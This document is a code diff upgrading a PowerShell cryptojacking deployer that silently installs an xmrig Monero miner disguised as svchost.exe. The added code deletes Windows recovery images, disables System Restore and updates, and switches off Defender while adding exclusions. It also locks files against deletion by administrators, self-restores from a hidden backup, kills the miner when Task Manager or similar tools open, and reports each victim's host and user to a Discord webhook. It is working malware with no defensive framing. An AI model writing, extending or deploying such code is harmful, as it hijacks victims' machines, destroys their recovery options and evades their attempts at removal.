@@ -1,9 +1,13 @@
 # ============================================================
-#  XMR Silent Miner Deployer v3 (ULTRA HARDENED + SILENT FIX)
+#  XMR Silent Miner Deployer v4.1 (HARDENED + UNDELETABLE)
 #  - Pulls config from PUBLIC GitHub repo
 #  - Dynamic idle/active CPU throttle
 #  - Survives reboots (schtasks + registry + startup folder)
-#  - HARDENED: WinRE Disabled + Updates Blocked
+#  - WinRE NUKED + System Restore killed + Updates blocked
+#  - Near-instant task manager / monitoring tool evasion
+#  - ACL lockdown: deny-delete for Admins & Users
+#  - File handle locking: watchdog holds open handles
+#  - Self-healing: hidden backup auto-restores deleted files
 # ============================================================
 
 # ==================== CONFIG ====================
@@ -30,30 +34,144 @@ $extractDir = "$env:TEMP\winsvc_extract"
 $xmrigApiPort = 45580
 $rigId = "$env:COMPUTERNAME"
 $worker = "$env:COMPUTERNAME"
+$backupDir = "$env:ProgramData\Microsoft\Windows\AppRepository\Packages\ServiceState"
 
 # ==================== FUNCTIONS ====================
 
 function Disable-WindowsHardening {
-    # ── 1. Disable Windows Recovery Environment (WinRE) ──
-    # [FIXED] Using native redirection for 100% silence in CMD
+    # ── 1. Disable WinRE via reagentc ──
+    try { & reagentc.exe /disable >$null 2>$null } catch {}
+
+    # ── 2. DELETE the WinRE image so it can never be re-enabled ──
     try {
-        & reagentc.exe /disable >$null 2>$null
+        $winrePaths = @(
+            "$env:SystemDrive\Recovery\WindowsRE\winre.wim",
+            "$env:SystemDrive\Windows\System32\Recovery\winre.wim",
+            "$env:SystemDrive\Recovery\WindowsRE\boot.sdi"
+        )
+        foreach ($wp in $winrePaths) {
+            if (Test-Path $wp) {
+                takeown /F $wp 2>$null
+                icacls $wp /grant "${env:USERNAME}:F" 2>$null
+                Remove-Item $wp -Force -ErrorAction SilentlyContinue
+            }
+        }
+        # Nuke the entire Recovery folder structure
+        $recoveryDir = "$env:SystemDrive\Recovery"
+        if (Test-Path $recoveryDir) {
+            takeown /F $recoveryDir /R /D Y 2>$null
+            icacls $recoveryDir /grant "${env:USERNAME}:(OI)(CI)F" /T 2>$null
+            Remove-Item $recoveryDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
     } catch {}
 
-    # ── 2. Block Reset Page in Settings UI ──
+    # ── 3. Block Reset / Recovery UI in Settings ──
     try {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
         if (!(Test-Path $regPath)) { New-Item $regPath -Force | Out-Null }
         Set-ItemProperty -Path $regPath -Name "NoRecoveryPage" -Value 1 -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # ── 3. Kill & Disable Windows Update Services ──
+    # ── 4. Disable System Restore completely ──
     try {
-        $services = @("wuauserv", "bits", "dosvc")
+        Disable-ComputerRestore -Drive "$env:SystemDrive\" -ErrorAction SilentlyContinue
+        $srRegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"
+        if (!(Test-Path $srRegPath)) { New-Item $srRegPath -Force | Out-Null }
+        Set-ItemProperty -Path $srRegPath -Name "DisableSR" -Value 1 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $srRegPath -Name "DisableConfig" -Value 1 -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    # ── 5. Kill & Disable Windows Update + Delivery Optimization ──
+    try {
+        $services = @("wuauserv", "bits", "dosvc", "UsoSvc", "WaaSMedicSvc")
         foreach ($svc in $services) {
             Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
             Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
         }
+    } catch {}
+
+    # ── 6. Block Windows Update via Group Policy registry ──
+    try {
+        $wuPol = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"
+        if (!(Test-Path $wuPol)) { New-Item $wuPol -Force | Out-Null }
+        Set-ItemProperty -Path $wuPol -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+function Unlock-InstallDirectory {
+    # Temporarily restore full permissions so deployer can write files
+    try {
+        takeown /F $installDir /R /D Y 2>$null
+        icacls $installDir /reset /T /Q 2>$null
+        icacls $installDir /grant "${env:USERNAME}:(OI)(CI)F" /T /Q 2>$null
+    } catch {}
+}
+
+function Lock-InstallDirectory {
+    # ── ACL LOCKDOWN: make files undeletable ──
+    try {
+        # Remove inheritance, start clean
+        icacls $installDir /inheritance:r /T /Q 2>$null
+
+        # Grant SYSTEM full control (needed for scheduled tasks running as SYSTEM)
+        icacls $installDir /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /Q 2>$null
+
+        # Grant current user read & execute ONLY (can run miner, can't delete)
+        icacls $installDir /grant:r "${env:USERNAME}:(OI)(CI)RX" /T /Q 2>$null
+
+        # DENY delete for Administrators group
+        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(DE,DC)" /T /Q 2>$null
+
+        # DENY delete for Users group
+        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(DE,DC)" /T /Q 2>$null
+
+        # DENY permission changes and ownership taking (prevents ACL bypass)
+        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(WDAC,WO)" /T /Q 2>$null
+        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(WDAC,WO)" /T /Q 2>$null
+
+        # Change owner to SYSTEM (admin can't easily reclaim)
+        $acl = Get-Acl $installDir
+        $systemSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
+        $acl.SetOwner($systemSid)
+        Set-Acl -Path $installDir -AclObject $acl -ErrorAction SilentlyContinue
+    } catch {}
+
+    # Hidden + System attributes on directory and all contents
+    try {
+        $dirInfo = Get-Item $installDir -Force
+        $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+        Get-ChildItem $installDir -Force -ErrorAction SilentlyContinue | ForEach-Object {
+            $_.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+        }
+    } catch {}
+}
+
+function Backup-MinerFiles {
+    try {
+        New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
+
+        $filesToBackup = @{
+            $xmrigExe    = "$backupDir\svchost.exe"
+            $configFile  = "$backupDir\config.json"
+            $watchdogPs1 = "$backupDir\watchdog.ps1"
+            $watchdogVbs = "$backupDir\monitor.vbs"
+        }
+
+        foreach ($src in $filesToBackup.Keys) {
+            if (Test-Path $src) {
+                Copy-Item -Path $src -Destination $filesToBackup[$src] -Force -ErrorAction SilentlyContinue
+            }
+        }
+
+        # Hide backup directory and contents
+        $dirInfo = Get-Item $backupDir -Force
+        $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+        Get-ChildItem $backupDir -Force -ErrorAction SilentlyContinue | ForEach-Object {
+            $_.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+        }
+
+        # Defender exclusion for backup
+        Add-MpPreference -ExclusionPath $backupDir -ErrorAction SilentlyContinue
     } catch {}
 }
 
@@ -69,13 +187,12 @@ function Install-Miner {
         }
     }
     catch {
-        # Fallback if WMI is broken or out of memory
         Get-Process -Name "svchost", "wscript" -ErrorAction SilentlyContinue | Where-Object {
             ($_.Path -like "*WindowsServices*") -or ($_.CommandLine -like "*monitor.vbs*") -or ($_.CommandLine -like "*watchdog.ps1*")
         } | Stop-Process -Force -ErrorAction SilentlyContinue
     }
     
-    # Absolute brute force fallback for locked files
+    # Brute force fallback for locked files
     try {
         taskkill /F /IM wscript.exe /T 2>$null
         $lockedProcs = Get-Process | Where-Object { $_.Path -like "*WindowsServices\svchost.exe*" }
@@ -86,12 +203,13 @@ function Install-Miner {
     }
     catch {}
     
-    # Wait a moment to ensure file locks are released
     Start-Sleep -Seconds 3
+
+    # Unlock directory ACLs so we can write fresh files
+    Unlock-InstallDirectory
 
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 
-    # Force all modern TLS protocols
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     }
@@ -99,7 +217,6 @@ function Install-Miner {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     }
 
-    # Download with retry: WebClient -> Invoke-WebRequest -> BitsTransfer
     $downloaded = $false
 
     # Method 1: WebClient
@@ -136,7 +253,6 @@ function Install-Miner {
 
     if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
 
-    # Try to disable Defender real-time protection before extraction
     try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}
 
     Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
@@ -152,14 +268,12 @@ function Install-Miner {
                 break
             } catch {}
         }
-        # If Defender ate it, re-extract and try again
         if ($attempt -lt 3) {
             Start-Sleep -Seconds 2
             try { Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force } catch {}
         }
     }
 
-    # Re-enable Defender
     try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
 
     if (-not $copied) { throw "xmrig.exe not found in archive (likely deleted by antivirus)" }
@@ -227,6 +341,8 @@ $ghRepo         = "___GHREPO___"
 $ghConfigPath   = "___GHCONFIGPATH___"
 $xmrigExe       = "___XMRIGEXE___"
 $configFile     = "___CONFIGFILE___"
+$installDir     = "___INSTALLDIR___"
+$backupDir      = "___BACKUPDIR___"
 $xmrigApiPort   = ___APIPORT___
 $rigId          = $env:COMPUTERNAME
 
@@ -239,6 +355,119 @@ $idleThreshold  = ___IDLETHRESHOLD___
 
 $lastState      = ""
 $configTimer    = [System.Diagnostics.Stopwatch]::StartNew()
+$persistTimer   = [System.Diagnostics.Stopwatch]::StartNew()
+$selfHealTimer  = [System.Diagnostics.Stopwatch]::StartNew()
+
+# ════════════════════════════════════════════════════════════
+#  MONITORING TOOL DETECTION (Near-Instant Kill)
+# ════════════════════════════════════════════════════════════
+$monitorTools = @(
+    "taskmgr","procexp","procexp64","perfmon","resmon",
+    "ProcessHacker","SystemInformer","procmon","procmon64","anvir"
+)
+
+function Test-MonitoringTools {
+    $found = Get-Process -Name $monitorTools -ErrorAction SilentlyContinue
+    return ($null -ne $found)
+}
+
+function Kill-MinerNow {
+    Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
+        Where-Object { $_.Path -like "*WindowsServices*" } |
+        Stop-Process -Force -ErrorAction SilentlyContinue
+}
+
+# Register WMI event — fires on process CREATION before the tool renders
+try {
+    $wmiQ = "SELECT * FROM Win32_ProcessStartTrace WHERE " +
+        "ProcessName='taskmgr.exe' OR ProcessName='Taskmgr.exe' OR " +
+        "ProcessName='procexp.exe' OR ProcessName='procexp64.exe' OR " +
+        "ProcessName='perfmon.exe' OR ProcessName='resmon.exe' OR " +
+        "ProcessName='ProcessHacker.exe' OR ProcessName='SystemInformer.exe' OR " +
+        "ProcessName='procmon.exe' OR ProcessName='procmon64.exe' OR " +
+        "ProcessName='anvir.exe'"
+    Register-WmiEvent -Query $wmiQ -SourceIdentifier "MonToolDetect" -Action {
+        # INSTANT KILL — miner is dead before process list renders
+        Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
+            Where-Object { $_.Path -like "*WindowsServices*" } |
+            Stop-Process -Force -ErrorAction SilentlyContinue
+    } | Out-Null
+} catch {
+    # Non-admin or broken WMI — polling fallback at 2s interval handles it
+}
+
+# ════════════════════════════════════════════════════════════
+#  FILE HANDLE LOCKING (prevents deletion while watchdog runs)
+# ════════════════════════════════════════════════════════════
+# Open read handles WITHOUT FileShare.Delete — any delete attempt
+# gets a sharing violation as long as these handles stay open.
+$fileHandles = @()
+$filesToLock = @($configFile, $watchdogPs1, ($xmrigExe -replace '[^\\]+$', 'monitor.vbs'))
+foreach ($f in $filesToLock) {
+    try {
+        if (Test-Path $f) {
+            $handle = [System.IO.File]::Open(
+                $f,
+                [System.IO.FileMode]::Open,
+                [System.IO.FileAccess]::Read,
+                [System.IO.FileShare]::ReadWrite   # Read+Write allowed, Delete is NOT
+            )
+            $fileHandles += $handle
+        }
+    } catch {}
+}
+
+# ════════════════════════════════════════════════════════════
+#  SELF-HEALING (restore deleted files from hidden backup)
+# ════════════════════════════════════════════════════════════
+function Restore-MinerFiles {
+    if (-not (Test-Path $backupDir)) { return $false }
+    $restored = $false
+
+    $restoreMap = @{
+        "$backupDir\svchost.exe"  = $xmrigExe
+        "$backupDir\config.json"  = $configFile
+    }
+
+    foreach ($src in $restoreMap.Keys) {
+        $dst = $restoreMap[$src]
+        if ((-not (Test-Path $dst)) -and (Test-Path $src)) {
+            try {
+                # Ensure install directory exists
+                $parentDir = Split-Path $dst -Parent
+                if (-not (Test-Path $parentDir)) {
+                    New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
+                }
+                Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
+                $restored = $true
+            } catch {}
+        }
+    }
+    return $restored
+}
+
+function Repair-ACL {
+    try {
+        icacls $installDir /inheritance:r /T /Q 2>$null
+        icacls $installDir /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /Q 2>$null
+        icacls $installDir /grant:r "${env:USERNAME}:(OI)(CI)RX" /T /Q 2>$null
+        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(DE,DC)" /T /Q 2>$null
+        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(DE,DC)" /T /Q 2>$null
+        icacls $installDir /deny "BUILTIN\Administrators:(OI)(CI)(WDAC,WO)" /T /Q 2>$null
+        icacls $installDir /deny "BUILTIN\Users:(OI)(CI)(WDAC,WO)" /T /Q 2>$null
+    } catch {}
+
+    try {
+        $dirInfo = Get-Item $installDir -Force -ErrorAction SilentlyContinue
+        if ($dirInfo) {
+            $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+        }
+    } catch {}
+}
+
+# ════════════════════════════════════════════════════════════
+#  CORE FUNCTIONS
+# ════════════════════════════════════════════════════════════
 
 function Fetch-GithubConfig {
     try {
@@ -260,14 +489,20 @@ function Ensure-MinerRunning {
     $proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
         Where-Object { $_.Path -like "*WindowsServices*" }
     if (-not $proc) {
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = $xmrigExe
-        $psi.Arguments = "--config=`"$configFile`""
-        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi.CreateNoWindow = $true
-        $psi.UseShellExecute = $false
-        [System.Diagnostics.Process]::Start($psi) | Out-Null
-        Start-Sleep -Seconds 4
+        # Check if exe exists, restore from backup if not
+        if (-not (Test-Path $xmrigExe)) {
+            Restore-MinerFiles | Out-Null
+        }
+        if (Test-Path $xmrigExe) {
+            $psi = New-Object System.Diagnostics.ProcessStartInfo
+            $psi.FileName = $xmrigExe
+            $psi.Arguments = "--config=`"$configFile`""
+            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+            $psi.CreateNoWindow = $true
+            $psi.UseShellExecute = $false
+            [System.Diagnostics.Process]::Start($psi) | Out-Null
+            Start-Sleep -Seconds 4
+        }
     }
 }
 
@@ -276,9 +511,7 @@ function Apply-Config {
     if (-not $cfg) { return }
 
     if ($cfg.killSwitch -eq $true) {
-        Get-Process -Name "svchost" -ErrorAction SilentlyContinue |
-            Where-Object { $_.Path -like "*WindowsServices*" } |
-            Stop-Process -Force -ErrorAction SilentlyContinue
+        Kill-MinerNow
         return
     }
 
@@ -296,8 +529,6 @@ function Apply-Config {
 
     Ensure-MinerRunning
 }
-
-$persistTimer = [System.Diagnostics.Stopwatch]::StartNew()
 
 function Repair-Persistence {
     $taskName = "WindowsServiceUpdate"
@@ -334,12 +565,31 @@ function Repair-Persistence {
             Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -Value "wscript.exe `"$vbsPath`"" -Force
         }
     } catch {}
+
+    # Repair ACLs on every persistence check
+    Repair-ACL
 }
 
-Ensure-MinerRunning
+# ── Initial start (skip if monitoring tools are open) ──
+if (-not (Test-MonitoringTools)) {
+    Ensure-MinerRunning
+}
 
+# ════════════════════════════════════════════════════════════
+#  MAIN WATCHDOG LOOP
+# ════════════════════════════════════════════════════════════
 while ($true) {
     try {
+        # ── PRIORITY 0: Monitoring tool detection (polling layer) ──
+        # WMI event handles instant kill on tool LAUNCH.
+        # This prevents restart while tools stay open.
+        if (Test-MonitoringTools) {
+            Kill-MinerNow
+            Start-Sleep -Seconds 2
+            continue
+        }
+
+        # ── Idle / Active CPU throttling ──
         $idleSecs = [IdleDetect]::GetIdleSeconds()
         $isIdle = $idleSecs -ge $idleThreshold
         $targetCpu = if ($isIdle) { $idleCpu } else { $activeCpu }
@@ -350,22 +600,33 @@ while ($true) {
             $lastState = $state
         }
 
-        # Pull config from GitHub every 30 minutes
+        # ── Pull config from GitHub every 30 minutes ──
         if ($configTimer.Elapsed.TotalSeconds -ge 1800) {
             $cfg = Fetch-GithubConfig
             Apply-Config -cfg $cfg
             $configTimer.Restart()
         }
 
+        # ── Repair persistence + ACLs every 30 minutes ──
         if ($persistTimer.Elapsed.TotalSeconds -ge 1800) {
             Repair-Persistence
             $persistTimer.Restart()
         }
 
+        # ── Self-healing check every 5 minutes ──
+        if ($selfHealTimer.Elapsed.TotalSeconds -ge 300) {
+            $wasRestored = Restore-MinerFiles
+            if ($wasRestored) {
+                Repair-ACL
+            }
+            $selfHealTimer.Restart()
+        }
+
+        # ── Ensure miner alive (won't run if monitoring tools detected above) ──
         Ensure-MinerRunning
     } catch {}
 
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 2
 }
 '@
 
@@ -374,6 +635,8 @@ while ($true) {
     $code = $code -replace '___GHCONFIGPATH___', $ghConfigPath
     $code = $code -replace '___XMRIGEXE___', $xmrigExe
     $code = $code -replace '___CONFIGFILE___', $configFile
+    $code = $code -replace '___INSTALLDIR___', $installDir
+    $code = $code -replace '___BACKUPDIR___', $backupDir
     $code = $code -replace '___APIPORT___', $xmrigApiPort.ToString()
     $code = $code -replace '___WALLET___', $wallet
     $code = $code -replace '___POOL___', $pool
@@ -485,11 +748,6 @@ function Set-Persistence {
         } -ErrorAction Stop | Out-Null
     }
     catch {}
-
-    try {
-        $dirInfo = Get-Item $installDir -Force
-        $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
-    } catch {}
 }
 
 function Start-Miner {
@@ -517,6 +775,7 @@ function Add-Exclusion {
         Add-MpPreference -ExclusionPath $installDir -ErrorAction Stop
         Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction Stop
         Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
+        Add-MpPreference -ExclusionPath $backupDir -ErrorAction Stop
     }
     catch {}
 }
@@ -549,10 +808,15 @@ function Send-DiscordWebhook {
             username = "SOINION"
             avatar_url = "https://i.imgur.com/4M34hiw.png"
             embeds = @(@{
-                    title = "New Miner Deployed!"
+                    title = "Miner Deployed (v4.1 — Hardened)"
                     color = 3447003
-                    fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }, @{ name = "OS"; value = "$osName"; inline = $false })
-                    footer = @{ text = "Deploy script executed successfully" }
+                    fields = @(
+                        @{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true },
+                        @{ name = "User"; value = "$env:USERNAME"; inline = $true },
+                        @{ name = "OS"; value = "$osName"; inline = $false },
+                        @{ name = "Protection"; value = "TM evasion + ACL lock + file handles + self-heal"; inline = $false }
+                    )
+                    footer = @{ text = "v4.1 — undeletable + reset-proof + invisible" }
                     timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
             })
         } | ConvertTo-Json -Depth 5
@@ -572,7 +836,7 @@ function Disable-Sleep {
 # ==================== MAIN ====================
 try {
     Add-Exclusion
-    Disable-WindowsHardening  # <── LOCKDOWN ENGAGED
+    Disable-WindowsHardening
     Disable-Sleep
     Enable-HugePages
     Install-Miner
@@ -580,11 +844,13 @@ try {
     Write-Watchdog
     Write-VbsLauncher
     Set-Persistence
+    Lock-InstallDirectory       # ← ACL lockdown AFTER all files written
+    Backup-MinerFiles           # ← Hidden backup for self-healing
     Start-Miner
     Start-Sleep -Seconds 4
     Start-Watchdog
     Send-DiscordWebhook
-    [Console]::WriteLine("[+] Miner + Watchdog deployed — $rigId pulling config from github.com/$ghOwner/$ghRepo")
+    [Console]::WriteLine("[+] Miner v4.1 deployed — HARDENED — $rigId")
 }
 catch {
     [Console]::WriteLine("[-] Deployment failed: $_")
